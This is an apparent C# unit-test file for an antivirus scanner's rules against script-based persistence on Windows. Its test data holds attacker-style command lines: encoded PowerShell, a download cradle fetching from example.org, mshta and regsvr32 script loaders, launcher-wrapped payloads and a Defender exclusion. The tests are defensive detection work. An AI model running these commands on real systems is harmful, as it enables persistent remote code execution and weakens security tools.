using System.Text;
using SapAV.Core.Mitre;
using SapAV.Core.Models;
using SapAV.Core.Persistence;
using SapAV.Core.Scanning;
using static SapAV.Core.Tests.Persistence.Judging;

namespace SapAV.Core.Tests.Persistence;

/// <summary>
/// E4: script-persistence rules on synthetic Run / task entries. Encoded PowerShell in every form (decoded for display), mshta,
/// rundll32 from user folders, and payloads behind Microsoft launchers (review C follow-up M4 / M9). Only harmless synthetic
/// commands (Write-Output, example.org URLs, files that don't exist) are used; nothing is executed or written.
/// </summary>
public sealed class ScriptPersistenceTests
{
    private const string Evil = @"C:\Users\alice\AppData\Roaming\Svc\evil.exe";

    private static readonly EnvironmentBlock Machine = new(new Dictionary<string, string>
    {
        ["SystemRoot"] = @"C:\Windows",
        ["windir"] = @"C:\Windows",
        ["Path"] = @"C:\Windows\system32;C:\Windows;C:\Windows\System32\WindowsPowerShell\v1.0\",
    });

    private static readonly CommandLineResolver Resolver = new(new SystemProbe());

    private static string Encode(string script) => Convert.ToBase64String(Encoding.Unicode.GetBytes(script));

    private static ResolvedCommand Resolve(string commandLine) => Resolver.Resolve(commandLine, Machine);

    /// <summary>Judges a per-user Run value with every file it runs scanned: Windows files Microsoft-signed, the rest unsigned.</summary>
    private static PersistenceJudgement JudgeRun(string commandLine, Func<string, bool>? signedByVendor = null)
    {
        var resolution = Resolve(commandLine);
        var entry = new PersistenceEntry(PersistenceKind.RunKey, Sid, UserRun, "App", commandLine, resolution, true);
        return JudgeEntry(entry, signedByVendor);
    }

    private static PersistenceJudgement JudgeEntry(PersistenceEntry entry, Func<string, bool>? signedByVendor = null)
    {
        FileScanReport? Scan(string? path) => path is null ? null
            : Report(path, signature: path.StartsWith(@"C:\Windows\", StringComparison.OrdinalIgnoreCase) ? MicrosoftSigned()
                : signedByVendor?.Invoke(path) == true ? VendorSigned() : null);

        var resolution = entry.Resolution;
        var additional = resolution.Additional.SelectMany(a => new[] { a.TargetPath, a.HostPath }).OfType<string>().Distinct()
            .ToDictionary(p => p, p => Scan(p)!, StringComparer.Ordinal);
        return Judge.Judge(entry, Scan(resolution.TargetPath), Scan(resolution.HostPath), new FakeAcl().WithFolder(@"C:\Users\alice"), additional);
    }

    // ---- Decoding ----

    [Theory]
    [InlineData("-e")]
    [InlineData("-ec")]
    [InlineData("-en")]
    [InlineData("-enc")]
    [InlineData("-EncodedCommand")]
    [InlineData("-ENCODEDC")]
    [InlineData("/enc")]
    [InlineData("\u2013enc")] // an en dash, which PowerShell accepts as a dash
    public void EveryEncodedCommandForm_IsFound_AndDecoded(string parameter)
    {
        var found = EncodedPowerShell.Find($"-NoProfile {parameter} {Encode("Write-Output 'sapav-e4'")}");

        Assert.Equal("Write-Output 'sapav-e4'", found?.Display);
        Assert.Null(found!.Problem);
    }

    [Theory]
    [InlineData("-ex Bypass -File C:\\x.ps1")]
    [InlineData("-EncodedArguments AAAA -Command Get-Date")]
    [InlineData("-ep Bypass -Command \"Write-Output -e\"")]
    [InlineData("")]
    public void OtherParameters_AreNotTheEncodedCommand(string arguments) => Assert.Null(EncodedPowerShell.Find(arguments));

    [Fact]
    public void TheDecodedCommand_IsSanitizedAndCapped_AndBadInputIsExplained()
    {
        var shown = EncodedPowerShell.Decode(Encode("Write-Output 'a'\r\n\u202Eevil\u0007" + new string('x', 500)));

        Assert.NotNull(shown.Display);
        Assert.True(shown.Display!.Length <= EncodedPowerShell.MaxDisplayLength);
        Assert.DoesNotContain('\n', shown.Display);
        Assert.DoesNotContain('\u202E', shown.Display);
        Assert.DoesNotContain('\u0007', shown.Display);
        Assert.Contains("isn't valid Base64", EncodedPowerShell.Decode("@@not-base64@@").Problem, StringComparison.Ordinal);
        Assert.Contains("longer than", EncodedPowerShell.Decode(new string('A', EncodedPowerShell.MaxEncodedLength + 4)).Problem, StringComparison.Ordinal);
        Assert.Contains("missing", EncodedPowerShell.Find("-NoProfile -enc")!.Problem, StringComparison.Ordinal);
    }

    // ---- Encoded PowerShell entries ----

    [Theory]
    [InlineData("powershell.exe -NoProfile -enc {0}")]
    [InlineData("cmd.exe /c powershell -e {0}")]
    [InlineData("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -EncodedCommand {0}")]
    public void EncodedPowerShell_InARunValue_IsSuspicious_AndShowsWhatItRuns(string template)
    {
        var judgement = JudgeRun(string.Format(System.Globalization.CultureInfo.InvariantCulture, template, Encode("Write-Output 'sapav-e4'")));

        Assert.Equal(Verdict.Suspicious, judgement.Verdict);
        var signal = Assert.Single(judgement.Signals, s => s.Rule == ScriptPersistenceRules.EncodedPowerShellId);
        Assert.Contains("decoded: \"Write-Output 'sapav-e4'\"", signal.Reason, StringComparison.Ordinal);
        Assert.Contains(MitreTechniqueIds.CommandObfuscation, judgement.SecondaryTechniqueIds);
        Assert.Contains(MitreTechniqueIds.PowerShell, judgement.SecondaryTechniqueIds);
    }

    [Fact]
    public void EncodedPowerShell_InAScheduledTask_ThatChangesDefender_IsDefenderTampering()
    {
        string arguments = $"-w hidden -enc {Encode("Add-MpPreference -ExclusionPath C:\\Users\\Public")}";
        var resolution = Resolver.ResolveProgram(@"%windir%\System32\WindowsPowerShell\v1.0\powershell.exe", arguments, Machine);
        var entry = new PersistenceEntry(PersistenceKind.ScheduledTask, null, @"\Updater", "Exec[0]", "powershell.exe " + arguments, resolution, true);

        var judgement = JudgeEntry(entry);

        Assert.Equal(Verdict.Suspicious, judgement.Verdict);
        Assert.Equal(ThreatCategory.DefenderTampering, Assert.Single(judgement.Detections).Category);
        Assert.Contains(MitreTechniqueIds.DisableOrModifyTools, judgement.SecondaryTechniqueIds);
        Assert.Equal(PersistencePriority.High, judgement.Priority);
    }

    [Fact]
    public void EncodedOrInlineDownloadCradles_AreNamed_ButAScriptsOwnArgumentsAreNotPowerShellParameters()
    {
        var cradle = JudgeRun($"powershell -enc {Encode("IEX (New-Object Net.WebClient).DownloadString('https://example.org/a')")}");
        Assert.Contains(cradle.Signals, s => s.Rule == ScriptPersistenceRules.PowerShellDownloadId && s.Reason.Contains("iex", StringComparison.OrdinalIgnoreCase));

        // After -File, "-e" belongs to the script: nothing to decode.
        var script = JudgeRun(@"powershell.exe -File C:\Users\alice\tool.ps1 -e AAAA");
        Assert.DoesNotContain(script.Signals, s => s.Rule == ScriptPersistenceRules.EncodedPowerShellId);
    }

    // ---- mshta ----

    [Fact]
    public void Mshta_InlineScript_RemoteHta_AndAUserFolderHta_AreFlagged_WithWhatRuns()
    {
        var inline = JudgeRun("mshta.exe javascript:a=new%20ActiveXObject('WScript.Shell');close()");
        Assert.Equal(Verdict.Suspicious, inline.Verdict);
        Assert.Contains(inline.Signals, s => s.Rule == ScriptPersistenceRules.MshtaScriptId && s.Reason.Contains("JavaScript", StringComparison.Ordinal));

        var remote = JudgeRun("mshta https://user:pw@example.org/a.hta?token=secret");
        var shown = Assert.Single(remote.Signals, s => s.Rule == ScriptPersistenceRules.MshtaScriptId).Reason;
        Assert.Contains("example.org", shown, StringComparison.Ordinal);
        Assert.DoesNotContain("secret", shown, StringComparison.Ordinal); // log form: no user info, query or fragment
        Assert.DoesNotContain("pw@", shown, StringComparison.Ordinal);

        var local = JudgeRun(@"mshta.exe C:\Users\alice\AppData\Roaming\x\run.hta");
        Assert.Equal(Verdict.Suspicious, local.Verdict);
        Assert.True(local.Has(ScriptPersistenceRules.MshtaUserFolderId));
    }

    // ---- rundll32 ----

    [Fact]
    public void Rundll32_LoadingAnUnsignedDllFromAUserFolder_IsSuspicious_ASignedOneScoresLess()
    {
        var unsigned = JudgeRun(@"rundll32.exe C:\Users\alice\AppData\Local\x\helper.dll,Start");
        Assert.Equal(Verdict.Suspicious, unsigned.Verdict);
        Assert.Equal(50, unsigned.Signals.Single(s => s.Rule == ScriptPersistenceRules.Rundll32UserFolderId).Score);
        Assert.Contains(MitreTechniqueIds.Rundll32, unsigned.SecondaryTechniqueIds);

        var signed = JudgeRun(@"rundll32.exe C:\Users\alice\AppData\Local\x\helper.dll,Start", _ => true);
        Assert.Equal(20, signed.Signals.Single(s => s.Rule == ScriptPersistenceRules.Rundll32UserFolderId).Score);

        var disguised = JudgeRun(@"rundll32.exe C:\Users\alice\AppData\Local\x\data.dat,Start");
        Assert.True(disguised.Has(ScriptPersistenceRules.Rundll32NonLibraryId));
    }

    [Theory]
    [InlineData("rundll32.exe shell32.dll,Control_RunDLL desk.cpl")]
    [InlineData("rundll32.exe shell32.dll,Control_RunDLL")]
    [InlineData("rundll32.exe shell32.dll,SHCreateLocalServerRunDll {9aa46009-3ce0-458a-a354-715610a075e6}")]
    [InlineData(@"C:\Windows\System32\rundll32.exe C:\Windows\System32\shell32.dll,#44")]
    public void NormalShell32Entries_StayClean(string commandLine)
    {
        var judgement = JudgeRun(commandLine);

        Assert.Equal((Verdict.Clean, PersistenceOutcome.Clean), (judgement.Verdict, judgement.Outcome));
        Assert.DoesNotContain(judgement.Signals, s => s.Rule.StartsWith("rundll32", StringComparison.Ordinal) || s.Rule == ScriptPersistenceRules.LauncherPayloadId);
    }

    // ---- Launcher payloads (M4 / M9) ----

    [Theory]
    [InlineData(@"rundll32.exe url.dll,FileProtocolHandler " + Evil, Evil, @"C:\Windows\System32\rundll32.exe")]
    [InlineData(@"rundll32 shell32.dll,ShellExec_RunDLL " + Evil + " -silent", Evil, @"C:\Windows\System32\rundll32.exe")]
    [InlineData(@"rundll32.exe zipfldr.dll,RouteTheCall " + Evil, Evil, @"C:\Windows\System32\rundll32.exe")]
    [InlineData(@"conhost.exe --headless " + Evil, Evil, @"C:\Windows\System32\conhost.exe")]
    [InlineData(@"conhost --headless --width 80 cmd.exe /c " + Evil, Evil, @"C:\Windows\System32\cmd.exe")]
    [InlineData(@"forfiles /p C:\Windows\System32 /m notepad.exe /c """ + Evil + @"""", Evil, @"C:\Windows\System32\forfiles.exe")]
    [InlineData(@"forfiles /m *.txt /c ""cmd /c 0x22" + Evil + @"0x22""", Evil, @"C:\Windows\System32\cmd.exe")]
    [InlineData(@"pcalua.exe -a " + Evil + " -c -x", Evil, @"C:\Windows\System32\pcalua.exe")]
    [InlineData(@"explorer.exe " + Evil, Evil, @"C:\Windows\explorer.exe")]
    [InlineData(@"msiexec /i C:\Users\alice\Downloads\setup.msi /qn", @"C:\Users\alice\Downloads\setup.msi", @"C:\Windows\System32\msiexec.exe")]
    [InlineData(@"msiexec.exe /y C:\Users\alice\AppData\Local\x\evil.dll", @"C:\Users\alice\AppData\Local\x\evil.dll", @"C:\Windows\System32\msiexec.exe")]
    public void PayloadsBehindMicrosoftLaunchers_AreExtracted(string commandLine, string payload, string host)
    {
        var resolution = Resolve(commandLine);

        Assert.Equal(payload, resolution.TargetPath);
        Assert.Equal(host, resolution.HostPath);
        Assert.Contains(ResolutionFlag.LauncherPayload, resolution.Flags);
    }

    [Fact]
    public void Regsvr32_JudgesTheScriptletAndEveryDll_NotOnlyTheLast()
    {
        var squiblydoo = Resolve(@"regsvr32 /s /n /u /i:C:\Users\alice\AppData\Roaming\x.sct scrobj.dll");
        Assert.Equal(@"C:\Users\alice\AppData\Roaming\x.sct", squiblydoo.TargetPath);
        Assert.Equal(@"C:\Windows\System32\scrobj.dll", Assert.Single(squiblydoo.Additional).TargetPath);

        var twoDlls = Resolve(@"regsvr32 /s C:\Users\alice\AppData\Roaming\evil.dll scrobj.dll");
        Assert.Equal(@"C:\Users\alice\AppData\Roaming\evil.dll", twoDlls.TargetPath);
        Assert.Equal(@"C:\Windows\System32\scrobj.dll", Assert.Single(twoDlls.Additional).TargetPath);

        var dllInstallArgument = Resolve("regsvr32 /n /i:U shell32.dll"); // a plain DllInstall argument is not a file
        Assert.Equal(@"C:\Windows\System32\shell32.dll", dllInstallArgument.TargetPath);
        Assert.Empty(dllInstallArgument.Additional);
    }

    [Theory]
    [InlineData("rundll32 url.dll,FileProtocolHandler evil.exe", null)] // a bare name: not on the known search order
    [InlineData("rundll32.exe url.dll,OpenURL https://example.org/a.hta", TargetUnresolvedReason.RemotePayload)]
    [InlineData("msiexec /i https://example.org/a.msi /qn", TargetUnresolvedReason.RemotePayload)]
    [InlineData("forfiles /p C:\\Users\\alice /m *.exe /c \"@path\"", TargetUnresolvedReason.HostArgumentsNotUnderstood)]
    [InlineData("conhost.exe --unknown-option evil.exe", TargetUnresolvedReason.HostArgumentsNotUnderstood)]
    [InlineData("rundll32 advpack.dll,LaunchINFSection setup,DefaultInstall", TargetUnresolvedReason.HostArgumentsNotUnderstood)]
    public void PayloadsThatCantBeExtracted_AreUnverified_NeverClean(string commandLine, TargetUnresolvedReason? reason)
    {
        var judgement = JudgeRun(commandLine);

        if (reason is { } expected)
        {
            Assert.Equal(expected, Resolve(commandLine).UnresolvedReason);
        }

        Assert.NotEqual(PersistenceOutcome.Clean, judgement.Outcome);
    }

    [Fact]
    public void AnUnsignedPayloadBehindALauncher_IsSuspicious_AMicrosoftOneIsNot()
    {
        var evil = JudgeRun(@"rundll32.exe url.dll,FileProtocolHandler " + Evil);
        Assert.Equal(Verdict.Suspicious, evil.Verdict);
        Assert.True(evil.Has(ScriptPersistenceRules.LauncherPayloadId));
        Assert.Contains(MitreTechniqueIds.Rundll32, evil.SecondaryTechniqueIds);

        var notepad = JudgeRun(@"explorer.exe C:\Windows\System32\notepad.exe");
        Assert.Equal(Verdict.Clean, notepad.Verdict);
    }

    [Theory]
    [InlineData("msiexec /x {11111111-2222-3333-4444-555555555555} /qn", @"C:\Windows\System32\msiexec.exe")]
    [InlineData("conhost.exe 0xffffffff -ForceV1", @"C:\Windows\System32\conhost.exe")]
    [InlineData(@"explorer.exe C:\Users\alice\Documents", @"C:\Windows\explorer.exe")]
    [InlineData("explorer.exe", @"C:\Windows\explorer.exe")]
    public void LaunchersWithoutAPayload_AreThemselves(string commandLine, string target)
    {
        var resolution = Resolve(commandLine);

        Assert.Equal(target, resolution.TargetPath);
        Assert.DoesNotContain(ResolutionFlag.LauncherPayload, resolution.Flags);
    }

    [Fact]
    public void AScriptInAnAlternateDataStream_IsNeverClean()
    {
        // E / D1 (L3): streams aren't enumerated by scans yet, but an autostart that runs one must not pass as Clean.
        const string command = @"wscript.exe C:\Users\alice\notes.txt:a.js";
        var resolution = Resolve(command);
        var judgement = JudgeRun(command);

        Assert.NotEqual(PersistenceOutcome.Clean, judgement.Outcome);
        Assert.True(resolution.TargetPath is null || resolution.TargetPath.EndsWith(":a.js", StringComparison.Ordinal), resolution.TargetPath);
    }

    /// <summary>The Windows files the entries name exist; nothing under the user profile does (so payload paths aren't probed true).</summary>
    private sealed class SystemProbe : IPathProbe
    {
        private static readonly HashSet<string> Existing = new(StringComparer.OrdinalIgnoreCase)
        {
            @"C:\Windows\System32\rundll32.exe", @"C:\Windows\System32\regsvr32.exe", @"C:\Windows\System32\cmd.exe",
            @"C:\Windows\System32\mshta.exe", @"C:\Windows\System32\conhost.exe", @"C:\Windows\System32\forfiles.exe",
            @"C:\Windows\System32\pcalua.exe", @"C:\Windows\System32\msiexec.exe", @"C:\Windows\explorer.exe",
            @"C:\Windows\System32\shell32.dll", @"C:\Windows\System32\url.dll", @"C:\Windows\System32\zipfldr.dll",
            @"C:\Windows\System32\advpack.dll", @"C:\Windows\System32\scrobj.dll", @"C:\Windows\System32\desk.cpl",
            @"C:\Windows\System32\notepad.exe", @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        };

        public bool FileExists(string path) => Existing.Contains(path);
    }
}
